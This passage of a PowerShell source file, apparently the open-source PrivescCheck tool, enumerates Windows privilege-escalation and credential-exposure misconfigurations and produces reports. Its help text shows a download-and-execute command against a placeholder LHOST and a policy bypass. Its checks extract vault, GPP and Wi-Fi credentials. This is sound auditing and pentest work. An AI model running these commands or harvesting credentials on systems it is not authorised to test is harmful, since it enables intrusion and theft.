function Invoke-PrivescCheck {
    <#
    .SYNOPSIS
    Enumerates common security misconfigurations that can be exploited for privilege escalation purposes.

    Author: @itm4n
    License: BSD 3-Clause

    .DESCRIPTION
    This script aims to identify security misconfigurations that are relevant for privilege escalation. It also provides some additional information that may help penetration testers to choose between several potential exploits. For example, if you find that a service is vulnerable to DLL hijacking but you can't restart it manually, you will find useful to know how often the machine is rebooted (in the case of a server). If you see that it is rebooted every night for instance, you may want to attempt an exploit.

    .PARAMETER Extended
    Set this flag to enable extended checks.

    .PARAMETER Experimental
    Set this flag to enable experimental checks.

    .PARAMETER Force
    Ignore warnings.

    .PARAMETER Silent
    Don't output test results, show only the final vulnerability report.

    .PARAMETER Report
    The base name of the output file report(s) (extension is appended automatically depending on the chosen file format(s)).

    .PARAMETER Format
    A comma-separated list of file formats (TXT,HTML,CSV,XML).

    .EXAMPLE
    PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck

    .EXAMPLE
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

    .EXAMPLE
    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PrivescCheck.ps1'); Invoke-PrivescCheck"
    #>

    [CmdletBinding()] param(
        [switch] $Extended = $false,
        [switch] $Experimental = $false,
        [switch] $Force = $false,
        [switch] $Silent = $false,
        [string] $Report,
        [ValidateSet("TXT","HTML","CSV","XML")]
        [string[]] $Format
    )

    # Check wether the current process has admin privileges.
    # The following check was taken from Pow*rUp.ps1
    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if ($IsAdmin) {
        if (-not $Force) {
            Write-Warning "You are running this script as an administrator! Some checks will be automatically disabled."
            Write-Warning "You can specify the '-Force' option to disable this warning message."
            Start-Sleep -Seconds 10
        }
    }

    # The following CSV data contains all the checks
    $AllChecksCsv = @"
"Id",                             "Command",                                    "Category",                      "DisplayName",                         "Severity", "Format",   "Extended", "RunIfAdmin",   "Experimental", "Description"
"USER_USER",                      "Invoke-UserCheck",                           "TA0043 - Reconnaissance",       "User identity",                       "Info",     "List",     "False",    "True",         "False",        "Get the full name of the current user (domain + username) along with the associated Security Identifier (SID)."
"USER_GROUPS",                    "Invoke-UserGroupsCheck",                     "TA0043 - Reconnaissance",       "User groups",                         "Info",     "Table",    "False",    "True",         "False",        "List all the groups that are associated to the current user's token."
"USER_RESTRICTED_SIDS",           "Invoke-UserRestrictedSidsCheck",             "TA0043 - Reconnaissance",       "User restricted SIDs",                "Info",     "Table",    "True",     "True",         "False",        "List the restricted SIDs that are associated to the current user's token, if it is WRITE RESTRICTED."
"USER_PRIVILEGES",                "Invoke-UserPrivilegesCheck",                 "TA0004 - Privilege Escalation", "User privileges",                     "Info",     "Table",    "False",    "False",        "False",        "List the current user's privileges and identify the ones that can be leveraged for local privilege escalation."
"USER_ENV",                       "Invoke-UserEnvCheck",                        "TA0006 - Credential Access",    "User environment variables",          "Info",     "Table",    "False",    "True",         "False",        "List the environment variables of the current process and try to identify any potentially sensitive information such as passwords or API secrets. This check is simply based on keyword matching and might not be entirely reliable."
"SERVICE_INSTALLED",              "Invoke-InstalledServicesCheck",              "TA0004 - Privilege Escalation", "Non-default services",                "Info",     "List",     "False",    "True",         "False",        "List all registered services and filter out the ones that are built into Windows. It does so by parsing the target executable's metadata."
"SERVICE_THIRD_PARTY",            "Invoke-ThirdPartyDriversCheck",              "TA0004 - Privilege Escalation", "Third-party Kernel drivers",          "Info",     "List",     "True",     "True",         "False",        "List third-party drivers (i.e. drivers that do not originate from Microsoft)."
"SERVICE_VULN_DRIVER",            "Invoke-VulnerableDriverCheck",               "TA0004 - Privilege Escalation", "Vulnerable Kernel drivers",           "High",     "List",     "False",    "True",         "False",        "Find drivers that are known to be vulnerable using the list provided by loldrivers.io. Note: only vulnerable drivers are checked, not the ones that are categorized as 'malicious'."
"SERVICE_PERMISSIONS",            "Invoke-ServicesPermissionsCheck",            "TA0004 - Privilege Escalation", "Service permissions",                 "High",     "List",     "False",    "False",        "False",        "Interact with the Service Control Manager (SCM) and check whether the current user can modify any registered service."
"SERVICE_PERMISSIONS_REGISTRY",   "Invoke-ServicesPermissionsRegistryCheck",    "TA0004 - Privilege Escalation", "Service registry permissions",        "High",     "List",     "False",    "False",        "False",        "Parse the registry and check whether the current user can modify the configuration of any registered service."
"SERVICE_IMAGE_PERMISSIONS",      "Invoke-ServicesImagePermissionsCheck",       "TA0004 - Privilege Escalation", "Service binary permissions",          "High",     "List",     "False",    "False",        "False",        "List all services and check whether the current user can modify the target executable or write files in its parent folder."
"SERVICE_UNQUOTED_PATH_INFO",     "Invoke-ServicesUnquotedPathCheck -Info",     "TA0004 - Privilege Escalation", "Service unquoted paths (info)",       "Info",     "List",     "True",     "False",        "False",        "List registered services and check whether any of them is configured with an unquoted path."
"SERVICE_UNQUOTED_PATH",          "Invoke-ServicesUnquotedPathCheck",           "TA0004 - Privilege Escalation", "Service unquoted paths",              "High",     "List",     "False",    "False",        "False",        "List registered services and check whether any of them is configured with an unquoted path that can be exploited."
"SERVICE_SCM_PERMISSIONS",        "Invoke-SCMPermissionsCheck",                 "TA0004 - Privilege Escalation", "Service Control Manager permissions", "High",     "List",     "False",    "False",        "False",        "Check whether the current user can perform any privileged actions on the Service Control Manager (SCM)."
"APP_INSTALLED",                  "Invoke-InstalledProgramsCheck",              "TA0043 - Reconnaissance",       "Non-default applications",            "Info",     "Table",    "True",     "True",         "False",        "Enumerate non-default and third-party applications by parsing the registry."
"APP_MODIFIABLE",                 "Invoke-ModifiableProgramsCheck",             "TA0004 - Privilege Escalation", "Application permissions",             "Medium",   "List",     "True",     "False",        "False",        "List non-default and third-party applications and report the ones that can be modified by the current user."
"APP_PROGRAMDATA",                "Invoke-ProgramDataCheck",                    "TA0004 - Privilege Escalation", "Non-default ProgramData folders",     "Info",     "List",     "True",     "False",        "True",         "List the non-default ProgramData folders and check whether the current user has write permissions. This check is purely informative and the results require manual analysis."
"APP_STARTUP_INFO",               "Invoke-ApplicationsOnStartupCheck -Info",    "TA0004 - Privilege Escalation", "Startup applications (info)",         "Info",     "List",     "True",     "True",         "False",        "Enumerate the system-wide applications that are run on start-up."
"APP_STARTUP",                    "Invoke-ApplicationsOnStartupCheck",          "TA0004 - Privilege Escalation", "Startup application permissions",     "Medium",   "List",     "True",     "False",        "False",        "Enumerate the system-wide applications that are run on start-up and check whether they can be modified by the current user."
"APP_PROCESSES",                  "Invoke-RunningProcessCheck",                 "TA0043 - Reconnaissance",       "Running processes",                   "Info",     "Table",    "True",     "True",         "False",        "List processes that are not owned by the current user and filter out common processes such as 'svchost.exe'."
"SCHTASKS_IMAGE_PERMISSIONS",     "Invoke-ScheduledTasksImagePermissionsCheck", "TA0004 - Privilege Escalation", "Scheduled task binary permissions",   "Medium",   "List",     "True",     "False",        "False",        "Enumerate the scheduled tasks that are not owned by the current user and checks whether the target binary can be modified. Note that, as a low-privileged user, it's not possible to enumerate all the scheduled tasks."
"SCHTASKS_UNQUOTED_PATH",         "Invoke-ScheduledTasksUnquotedPathCheck",     "TA0004 - Privilege Escalation", "Scheduled task unquoted paths",       "Medium",   "List",     "True",     "False",        "True",         "Enumerate the scheduled tasks that are not owned by the current user and checks whether the corresponding command uses an exploitable unquoted path. Note that, as a low-privileged user, it's not possible to enumerate all the scheduled tasks."
"CREDS_SENSITIVE_HIVE_FILES",     "Invoke-SensitiveHiveFileAccessCheck",        "TA0006 - Credential Access",    "Hive file permissions",               "Medium",   "List",     "False",    "False",        "False",        "Check whether the SAM/SYSTEM/SECURITY files are configured with weak permissions, allowing a low-privileged user to read them - HiveNightmare (CVE-2021-36934)."
"CREDS_SENSITIVE_HIVE_FILES_VSS", "Invoke-SensitiveHiveShadowCopyCheck",        "TA0006 - Credential Access",    "Hive file shadow copy permissions",   "High",     "List",     "False",    "False",        "False",        "Check whether the SAM/SYSTEM/SECURITY files in shadow copies are configured with weak permissions, allowing a low-privileged user to read them. Can happen when HiveNightmare (CVE-2021-36934) mitigations have not been applied manually."
"CREDS_UNATTEND",                 "Invoke-UnattendFilesCheck",                  "TA0006 - Credential Access",    "Unattend file credentials",           "Medium",   "List",     "False",    "True",         "False",        "Locate 'Unattend' files and check whether they contain any clear-text credentials."
"CREDS_WINLOGON",                 "Invoke-WinlogonCheck",                       "TA0006 - Credential Access",    "WinLogon credentials",                "Medium",   "List",     "False",    "True",         "False",        "Parse the Winlogon registry keys and check whether they contain any clear-text password. Entries that have an empty password field are filtered out."
"CREDS_CRED_FILES",               "Invoke-CredentialFilesCheck",                "TA0006 - Credential Access",    "Credential files",                    "Info",     "List",     "True",     "False",        "False",        "Enumerate the credential files that are present in the current user's HOME folder. This is purely informative."
"CREDS_VAULT_CRED",               "Invoke-VaultCredCheck",                      "TA0006 - Credential Access",    "Vault credentials (creds)",           "Info",     "List",     "True",     "True",         "False",        "Enumerate the credentials that are saved in the current user's vault."
"CREDS_VAULT_LIST",               "Invoke-VaultListCheck",                      "TA0006 - Credential Access",    "Vault credentials (list)",            "Info",     "List",     "True",     "True",         "False",        "Enumerate the web credentials that are saved in the current user's Vault."
"CREDS_GPP",                      "Invoke-GPPPasswordCheck",                    "TA0006 - Credential Access",    "GPP passwords",                       "Medium",   "List",     "False",    "True",         "False",        "Locate old cached Group Policy Preference files that contain a 'cpassword' field and extract the clear-text credentials."
"CREDS_PS_HIST",                  "Invoke-PowerShellHistoryCheck",              "TA0006 - Credential Access",    "PowerShell history",                  "Info",     "List",     "True",     "True",         "False",        "Locate the current user's PowerShell history file and check whether it contains some clear-text credentials. This check is simply based on keyword matching and might not be entirely reliable."
"HARDEN_UAC",                     "Invoke-UacCheck",                            "TA0004 - Privilege Escalation", "UAC settings",                        "Low",      "List",     "False",    "True",         "False",        "Retrieve the User Access Control (UAC) configuration and check whether it is enabled."
"HARDEN_LSA_PROTECTION_INFO",     "Invoke-LsaProtectionCheck",                  "TA0005 - Defense Evasion",      "LSA Protection",                      "Info",     "List",     "True",     "True",         "False",        "Checks the status of LSA protection (a.k.a. RunAsPPL)."
"HARDEN_CREDENTIAL_GUARD",        "Invoke-CredentialGuardCheck",                "TA0005 - Defense Evasion",      "Credential Guard",                    "Low",      "List",     "False",    "True",         "False",        "Checks whether Credential Guard is supported and enabled."
"HARDEN_BIOS_MODE",               "Invoke-BiosModeCheck",                       "TA0003 - Persistence",          "UEFI & Secure Boot",                  "Info",     "Table",    "True",     "True",         "False",        "Checks whether UEFI and Secure are supported and enabled."
"HARDEN_LAPS",                    "Invoke-LapsCheck",                           "TA0008 - Lateral Movement",     "LAPS",                                "Medium",   "List",     "False",    "True",         "False",        "Checks whether LAPS is enabled."
"HARDEN_PS_TRANSCRIPT",           "Invoke-PowershellTranscriptionCheck",        "TA0005 - Defense Evasion",      "PowerShell transcription",            "Info",     "List",     "True",     "True",         "False",        "Check whether PowerShell Transcription is configured and enabled. If so, the path of the output log file will be returned."
"HARDEN_BITLOCKER",               "Invoke-BitLockerCheck",                      "TA0001 - Initial Access",       "BitLocker configuration",             "Medium",   "List",     "False",    "True",         "False",        "Check whether BitLocker is enabled on the system drive. If so, report the configured startup authentication mode. If the configuration does not enforce advanced TPM authentication with a PIN, a startup key, or both, the result is considered as non-compliant."
"CONFIG_PATH_FOLDERS",            "Invoke-DllHijackingCheck",                   "TA0004 - Privilege Escalation", "PATH folder permissions",             "High",     "List",     "False",    "False",        "False",        "Retrieve the list of SYSTEM %PATH% folders and check whether the current user has some write permissions in any of them."
"MISC_HIJACKABLE_DLL",            "Invoke-HijackableDllsCheck",                 "TA0004 - Privilege Escalation", "Known ghost DLLs",                    "Info",     "List",     "False",    "False",        "False",        "List Windows services that are prone to Ghost DLL hijacking. This is particularly relevant if the current user can create files in one of the SYSTEM %PATH% folders."
"CONFIG_MSI",                     "Invoke-RegistryAlwaysInstallElevatedCheck",  "TA0004 - Privilege Escalation", "AlwaysInstallElevated",               "High",     "List",     "False",    "False",        "False",        "Check whether the 'AlwaysInstallElevated' registry keys are configured and enabled. If so any user might be able to run arbitary MSI files with SYSTEM privileges."
"CONFIG_WSUS",                    "Invoke-WsusConfigCheck",                     "TA0008 - Lateral Movement",     "WSUS configuration",                  "High",     "List",     "False",    "True",         "False",        "If WSUS is configured and enabled, check whether the service uses an insecure URL (http://*). If so, it might be vulnerable to MitM attacks. Note that in case of local exploitation, the value of 'SetProxyBehaviorForUpdateDetection' determines whether the service uses the system or user proxy settings."
"CONFIG_HARDENED_UNC_PATHS",      "Invoke-HardenedUNCPathCheck",                "TA0008 - Lateral Movement",     "Hardened UNC paths",                  "Medium",   "List",     "False",    "True",         "False",        "Check hardened UNC paths. If not properly configured, a Man-in-the-Middle might be able to run arbitrary code with SYSTEM privileges by injecting malicious group policies during a group policy update (SYSVOL only)."
"CONFIG_SCCM_INFO",               "Invoke-SccmCacheFolderCheck -Info",          "TA0006 - Credential Access",    "SCCM cache folder",                   "Info",     "List",     "False",    "True",         "False",        "Checks whether the SCCM cache folder exists. Manual investigation might be required during post-exploitation."
"CONFIG_SCCM",                    "Invoke-SccmCacheFolderCheck",                "TA0006 - Credential Access",    "SCCM cache folder permissions",       "Medium",   "List",     "False",    "False",        "False",        "Checks whether the current user can browse the SCCM cache folder. If so, hardcoded credentials might be extracted from MSI package files or scripts."
"CONFIG_PRINTNIGHTMARE",          "Invoke-PointAndPrintConfigCheck",            "TA0004 - Privilege Escalation", "Point and Print configuration",       "High",     "List",     "False",    "True",         "False",        "Checks whether the Print Spooler service is enabled and if the Point and Print configuration allows low-privileged users to install printer drivers."
"CONFIG_COINSTALLERS",            "Invoke-DriverCoInstallersCheck",             "TA0004 - Privilege Escalation", "Driver co-installers",                "Low",      "List",     "False",    "True",         "False",        "Check whether the 'DisableCoInstallers' registry key is absent or disabled. If so any user might be able to run arbitrary code with SYSTEM privileges by plugging a device automatically installing vulnerable software along with its driver."
"NET_ADAPTERS",                   "Invoke-NetworkAdaptersCheck",                "TA0043 - Reconnaissance",       "Network interfaces",                  "Info",     "List",     "True",     "True",         "False",        "Collect detailed information about all active Ethernet adapters."
"NET_TCP_ENDPOINTS",              "Invoke-TcpEndpointsCheck",                   "TA0004 - Privilege Escalation", "TCP endpoint servers",                "Info",     "Table",    "True",     "False",        "False",        "List all TCP ports that are in a LISTEN state. For each one, the corresponding process is also returned."
"NET_UDP_ENDPOINTS",              "Invoke-UdpEndpointsCheck",                   "TA0004 - Privilege Escalation", "UDP endpoint servers",                "Info",     "Table",    "True",     "True",         "False",        "List all UDP ports that are in a LISTEN state. For each one, the corresponding process is also returned. DNS is filtered out to minimize the output."
"NET_WLAN",                       "Invoke-WlanProfilesCheck",                   "TA0001 - Initial Access",       "Wi-Fi profiles",                      "Low",      "List",     "True",     "True",         "False",        "Enumerate saved Wifi profiles. For WEP/WPA-PSK profiles, the clear-text passphrase is extracted (when possible). For 802.1x profiles, a series of tests is performed to highlight potential misconfiguration."
"NET_AIRSTRIKE",                  "Invoke-AirstrikeAttackCheck",                "TA0001 - Initial Access",       "Network selection from lock screen",  "Low",      "List",     "False",    "True",         "False",        "Checks whether the 'Do not display network selection UI' policy is enforced on workstations (c.f. Airstrike attack)."
"UPDATE_HISTORY",                 "Invoke-WindowsUpdateCheck",                  "TA0004 - Privilege Escalation", "Last Windows Update date",            "Info",     "Table",    "True",     "True",         "False",        "Interact with the Windows Update service and determine when the system was last updated. Note that this check might be unreliable."
"UPDATE_HOTFIX_INFO",             "Invoke-HotFixCheck -Info",                   "TA0004 - Privilege Escalation", "Windows Update history",              "Info",     "Table",    "True",     "True",         "False",        "Enumerate the installed updates and hotfixes by parsing the registry. If this fails, the check will fall back to the built-in 'Get-HotFix' cmdlet."
"UPDATE_HOTFIX",                  "Invoke-HotFixCheck",                         "TA0004 - Privilege Escalation", "Latest updates installed",            "Medium",   "Table",    "False",    "True",         "False",        "Enumerate the installed updates and hotfixes and check whether a patch was applied in the last 31 days."
"MISC_AVEDR",                     "Invoke-EndpointProtectionCheck",             "TA0005 - Defense Evasion",      "Endpoint protection software",        "Info",     "Table",    "True",     "True",         "False",        "Enumerate installed security products (AV, EDR). This check is based on keyword matching (loaded DLLs, running processes, installed applications and registered services)."
"MISC_DEFENDER_EXCLUSIONS",       "Invoke-DefenderExclusionsCheck",             "TA0005 - Defense Evasion",      "Windows Defender exclusions",         "Info",     "Table",    "True",     "True",         "False",        "List Microsoft Defender exclusions that were configured both locally and through GPO."
"MISC_SYSINFO",                   "Invoke-SystemInfoCheck",                     "TA0043 - Reconnaissance",       "Windows version",                     "Info",     "Table",    "True",     "True",         "False",        "Print the detailed version number of the Operating System. If we can't get the update history, this might be useful."
"MISC_ADMINS",                    "Invoke-LocalAdminGroupCheck",                "TA0043 - Reconnaissance",       "Local administrators group",          "Info",     "Table",    "True",     "True",         "False",        "Enumerate the users and groups that belong to the local 'Administrators' group."
"MISC_USER_SESSION_LIST",         "Invoke-UserSessionListCheck",                "TA0004 - Privilege Escalation", "User sessions",                       "Info",     "Table",    "False",    "True",         "False",        "Enumerate the sessions of the currently logged-on users. It might be possible to capture or relay the NTLM/Kerberos authentication of these users (RemotePotato0, KrbRelay)."
"MISC_HOMES",                     "Invoke-UsersHomeFolderCheck",                "TA0043 - Reconnaissance",       "User home folders",                   "Info",     "Table",    "True",     "False",        "False",        "Enumerate local HOME folders and check for potentially weak permissions."
"MISC_MACHINE_ROLE",              "Invoke-MachineRoleCheck",                    "TA0043 - Reconnaissance",       "Machine role",                        "Info",     "Table",    "True",     "True",         "False",        "Simply return the machine's role. It can be either 'Workstation', 'Server' or 'Domain Controller'."
"MISC_STARTUP_EVENTS",            "Invoke-SystemStartupHistoryCheck",           "TA0004 - Privilege Escalation", "System startup history",              "Info",     "Table",    "True",     "True",         "False",        "Retrieve the machine's startup history. This might be useful to figure out how often a server is rebooted. In the case of a workstation, such metric isn't as relevant."
"MISC_STARTUP_LAST",              "Invoke-SystemStartupCheck",                  "TA0004 - Privilege Escalation", "Last system startup time",            "Info",     "Table",    "True",     "True",         "False",        "Determine the last system startup date and time based on the current tick count. Note that this might be unreliable."
"MISC_DRIVES",                    "Invoke-SystemDrivesCheck",                   "TA0043 - Reconnaissance",       "Filesystem drives",                   "Info",     "Table",    "True",     "True",         "False",        "List partitions, removable storage and mapped network shares."
"MISC_NAMED_PIPES",               "Invoke-NamedPipePermissionsCheck",           "TA0004 - Privilege Escalation", "Named pipe permissions",              "Info",     "List",     "True",     "False",        "True",         "List modifiable named pipes that are not owned by the current user."
"MISC_LEAKED_HANDLES",            "Invoke-ExploitableLeakedHandlesCheck",       "TA0004 - Privilege Escalation", "Exploitable leaked handles",          "Info",     "List",     "True",     "False",        "True",         "List leaked handles to privileged objects such as Processes, Threads, and Files."
"@

    # Reset all global ArrayLists on startup
    $global:CachedServiceList.Clear()
    $global:CachedHotFixList.Clear()
    $global:CachedScheduledTaskList.Clear()
    $global:ResultArrayList.Clear()

    $AllChecks = New-Object System.Collections.ArrayList

    # Load default checks
    $AllChecksCsv | ConvertFrom-Csv | ForEach-Object {
        [void] $AllChecks.Add($_)
    }

    $CheckCounter = 0
    foreach ($Check in $AllChecks) {

        $CheckCounter += 1
        $RunIfAdminCheck = [System.Convert]::ToBoolean($Check.RunIfAdmin)
        $ExtendedCheck = [System.Convert]::ToBoolean($Check.Extended)
        $ExperimentalCheck = [System.Convert]::ToBoolean($Check.Experimental)

        # If the current user is an admin but the check's RunIfAdmin flag was not set to true, ignore it.
        if ($IsAdmin -and (-not $RunIfAdminCheck)) { continue }

        # If it's an extended check but the Extended switch was not set to true, ignore it.
        if ($ExtendedCheck -and (-not $Extended)) { continue }

        # If it's an experimental check but the Experimental switch was not set to true, ignore it.
        if ($ExperimentalCheck -and (-not $Experimental)) { continue }

        if (-not $Silent) {
            Write-CheckBanner -Check $Check
        }

        # Run the check and store its output in a temp variable.
        $CheckResult = Invoke-Check -Check $Check

        if (-not $Silent) {
            # If the 'Silent' option was not specified, print a banner that shows some information about the
            # current check. Then, run the check and print the output either as a table or a list, depending on
            # the 'Format' value in the CSV data.
            Write-CheckResult -CheckResult $CheckResult
        }
        else {
            # If the 'Silent' option was specified, don't print the output of the check but write a progress bar
            # and show the name of the check which is being run. Note: if we are not running in a console window
            # Write-Progress will fail, so use Write-Output to print the completion percentage instead.
            $Completion = [UInt32](($CheckCounter * 100) / ($AllChecks.Count))

            if (Test-IsRunningInConsole) {
                Write-Progress -Activity "$($Check.Category.ToUpper()) > $($Check.DisplayName)" -Status "Progress: $($Completion)%" -PercentComplete $Completion
            }
            else {
                Write-Output "[$($Completion)%] $($Check.Category.ToUpper()) > $($Check.DisplayName)"
            }
        }
    }

    # Print a report on the terminal as an 'ASCII-art' table with colors using 'Write-Host'. Therefore,
    # this will be only visible if run from a 'real' terminal.
    # Show-PrivescCheckAsciiReport
    Write-ShortReport

    # If the 'Report' option was specified, write a report to a file using the value of this parameter
    # as the basename (or path + basename). The extension is then determined based on the chosen
    # format(s).
    if ($Report) {

        if (-not $Format) {
            # If a format or a format list was not specified, default to the TXT format.
            [string[]] $Format = "TXT"
        }

        $Format | ForEach-Object {
            # For each format, build the name of the output report file as BASENAME + . + EXT. Then generate the
            # report corresponding to the current format and write it to a file using the previously formatted
            # filename.
            $ReportFileName = "$($Report.Trim()).$($_.ToLower())"
            switch ($_) {
                "TXT"   { Write-TxtReport  -AllResults $ResultArrayList | Out-File $ReportFileName }
                "HTML"  { Write-HtmlReport -AllResults $ResultArrayList | Out-File $ReportFileName }
                "CSV"   { Write-CsvReport  -AllResults $ResultArrayList | Out-File $ReportFileName }
                "XML"   { Write-XmlReport  -AllResults $ResultArrayList | Out-File $ReportFileName }
                default { Write-Warning "`r`nReport format not implemented: $($Format.ToUpper())`r`n" }
            }
        }
    }

    # If the 'Extended' mode was not specified, print a warning message, unless the 'Force' parameter
    # was specified.
    if ((-not $Extended) -and (-not $Force) -and (-not $Silent)) {
        Write-Warning "To get more info, run this script with the option '-Extended'."
    }
}

function Invoke-Check {

    [CmdletBinding()] param(
        [object] $Check
    )

    $Result = Invoke-Expression -Command "$($Check.Command)"
    $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRaw" -Value $Result

    if ($Check.Format -eq "Table") {
        $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Result | Format-Table | Out-String)
    }
    elseif ($Check.Format -eq "List") {
        $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Result | Format-List | Out-String)
    }

    $IsInfoCheck = $Check.Severity -eq "Info"

    if ($IsInfoCheck) {
        if ($null -eq $Result) {
            # If the check did not yield any result, we cannot determine whether it is compliant or not. So,
            # in this case, set the compliance to "N/A".
            $Compliance = "N/A"
        }
        else {
            # If the result list is not empty, iterate it and determine the compliance as follows. First,
            # if we find an object that does not have a "Compliance" attribute, set the compliance to "N/A".
            # However, if the returned objects have a "Compliance" attribute, then assume that the compliance
            # is True by default, and set it to False as soon as we find a non-compliant result.
            $Compliance = "True"
            foreach ($Res in [object[]]$Result) {
                if ($null -eq $Res.Compliance) { $Compliance = "N/A"; break }
                if ($Res.Compliance -eq $false) { $Compliance = "False"; break }
            }
        }
        $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value $Compliance
        $Check.Severity = "None"
    }
    else {
        $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value $($null -eq $Result)
        $Check.Severity = $(if ($null -eq $Result) { "None" } else { $Check.Severity } )
    }

    [void] $ResultArrayList.Add($Check)
    $Check
}

function Write-CheckBanner {

    [OutputType([string])]
    [CmdletBinding()] param(
        [object] $Check,
        [switch] $Ascii
    )
    
    function Split-Description {
        param([string]$Description)

        $DescriptionSplit = New-Object System.Collections.ArrayList
        $TempOld = ""
        $TempNew = ""
        $Description.Split(' ') | ForEach-Object {

            $TempNew = "$($TempOld) $($_)".Trim()
            if ($TempNew.Length -gt 60) {
                [void]$DescriptionSplit.Add($TempOld)
                $TempOld = "$($_)"
            }
            else {
                $TempOld = $TempNew
            }
        }
        if ($TempOld) {
            [void]$DescriptionSplit.Add($TempOld)
        }
        $DescriptionSplit
    }

    $HeavyVertical =          [char] $(if ($Ascii) { '|' } else { 0x2503 })
    $HeavyHorizontal =        [char] $(if ($Ascii) { '-' } else { 0x2501 })
    $HeavyVerticalAndRight =  [char] $(if ($Ascii) { '+' } else { 0x2523 })
    $HeavyVerticalAndLeft =   [char] $(if ($Ascii) { '+' } else { 0x252B })
    $HeavyDownAndHorizontal = [char] $(if ($Ascii) { '+' } else { 0x2533 })
    $HeavyUpAndHorizontal =   [char] $(if ($Ascii) { '+' } else { 0x253B })
    $HeavyDownAndLeft =       [char] $(if ($Ascii) { '+' } else { 0x2513 })
    $HeavyDownAndRight =      [char] $(if ($Ascii) { '+' } else { 0x250F })
    $HeavyUpAndRight =        [char] $(if ($Ascii) { '+' } else { 0x2517 })
    $HeavyUpAndLeft =         [char] $(if ($Ascii) { '+' } else { 0x251B })

    $Result = ""
    $Result += "$($HeavyDownAndRight)$("$HeavyHorizontal" * 10)$($HeavyDownAndHorizontal)$("$HeavyHorizontal" * 51)$($HeavyDownAndLeft)`n"
    $Result += "$($HeavyVertical) CATEGORY $($HeavyVertical) $($Check.Category)$(' ' * (49 - $Check.Category.Length)) $($HeavyVertical)`n"
    $Result += "$($HeavyVertical) NAME     $($HeavyVertical) $($Check.DisplayName)$(' ' * (49 - $Check.DisplayName.Length)) $($HeavyVertical)`n"
    $Result += "$($HeavyVerticalAndRight)$("$HeavyHorizontal" * 10)$($HeavyUpAndHorizontal)$("$HeavyHorizontal" * 51)$($HeavyVerticalAndLeft)`n"
    Split-Description -Description $Check.Description | ForEach-Object {
        $Result += "$($HeavyVertical) $($_)$(' '*(60 - ([String]$_).Length)) $($HeavyVertical)`n"
    }
    $Result += "$($HeavyUpAndRight)$("$HeavyHorizontal" * 62)$($HeavyUpAndLeft)"
    $Result
}

function Write-CheckResult {

    [OutputType([string])]
    [CmdletBinding()] param(
        [object] $CheckResult
    )

    $FindingCount = $(if ($CheckResult.ResultRaw) { ([Object[]]$CheckResult.ResultRaw).Length } else { 0 })

    "[*] Number of findings: $($FindingCount)`n$(if ($null -ne $FindingOutput) { $FindingOutput })"

    if ($FindingCount -gt 0) {
        switch ($CheckResult.Format) {
            "Table"     { $CheckResult.ResultRaw | Format-Table -AutoSize }
            "List"      { $CheckResult.ResultRaw | Format-List }
            default     { Write-Warning "Unknown format: $($CheckResult.Format)" }
        }
    }

    "`r`n"
}

function Write-TxtReport {

    [CmdletBinding()] param(
        [object[]] $AllResults
    )

    $AllResults | ForEach-Object {
        Write-CheckBanner -Check $_ -Ascii
        Write-CheckResult -CheckResult $_
    }
}

function Write-CsvReport {

    [CmdletBinding()] param(
        [object[]] $AllResults
    )

    $AllResults | Sort-Object -Property "Category" | Select-Object -Property "Category","DisplayName","Description","Compliance","Severity","ResultRawString" | ConvertTo-Csv -NoTypeInformation
}

function Write-XmlReport {
    <#
    .NOTES
    According to the XML specification, some characters are invalid. The raw result of a check ("ResultRawString") may contain such characters. Therefore, this result must be sanitized before calling "ConvertTo-Xml". The method used here was taken from a solution that was posted on StackOverflow.

    .LINK
    https://github.com/itm4n/PrivescCheck/issues/24
    https://stackoverflow.com/questions/45706565/how-to-remove-special-bad-characters-from-xml-using-powershell
    #>

    [CmdletBinding()] param(
        [object[]] $AllResults
    )

    $AuthorizedXmlCharactersRegex = "[^\x09\x0A\x0D\x20-\xD7FF\xE000-\xFFFD\x10000\x10FFFF]"
    $AllResults | ForEach-Object {
        $_.ResultRawString = [System.Text.RegularExpressions.Regex]::Replace($_.ResultRawString, $AuthorizedXmlCharactersRegex, "")
        $_
    } | Sort-Object -Property "Category" | Select-Object Id,Category,DisplayName,Description,Compliance,Severity,ResultRawString | ConvertTo-Xml -As String
}

function Write-HtmlReport {

    [OutputType([string])]
    [CmdletBinding()] param(
        [object[]] $AllResults
    )

    $JavaScript = @"
var cells = document.getElementsByTagName('td');

for (var i=0; i<cells.length; i++) {
    var bg_color = null;
    if (cells[i].innerHTML == "True") {
        bg_color = "bg_green";
    } else if (cells[i].innerHTML == "False") {
        bg_color = "bg_red";
    } else if (cells[i].innerHTML == "Low") {
        bg_color = "bg_green";
    } else if (cells[i].innerHTML == "Medium") {
        bg_color = "bg_orange";
    } else if (cells[i].innerHTML == "High") {
        bg_color = "bg_red";
    } else if (cells[i].innerHTML == "Info") {
        bg_color = "bg_blue";
    } else if (cells[i].innerHTML == "None") {
        bg_color = "bg_grey";
    } else if (cells[i].innerHTML == "OK") {
        bg_color = "bg_green";
    } else if (cells[i].innerHTML == "KO") {
        bg_color = "bg_red";
    } else if (cells[i].innerHTML == "N/A") {
        bg_color = "bg_grey";
    }

    if (bg_color) {
        cells[i].innerHTML = "<span class=\"label " + bg_color + "\">" + cells[i].innerHTML + "</span>";
    }

    // If a cell is too large, we need to make it scrollable. But 'td' elements are not
    // scrollable so, we need make it a 'div' first and apply the 'scroll' (c.f. CSS) style to make
    // it scrollabale.
    if (cells[i].offsetHeight > 200) {
        cells[i].innerHTML = "<div class=\"scroll\">" + cells[i].innerHTML + "</div>";
        console.log("Cells height is greater than 200");
    }
}
"@

    $Css = @"
body {
    font:1.2em normal Arial,sans-serif;
    color:#34495E;
    }

h1 {
    text-align:center;
    text-transform:uppercase;
    letter-spacing:-2px;
    font-size:2.5em;
    margin:20px 0;
}

table {
    border-collapse:collapse;
    width:100%;
    border:2px solid #6699ff;
}

th {
    color:white;
    background:#6699ff;
    text-align:center;
    padding:5px 0;
}

td {
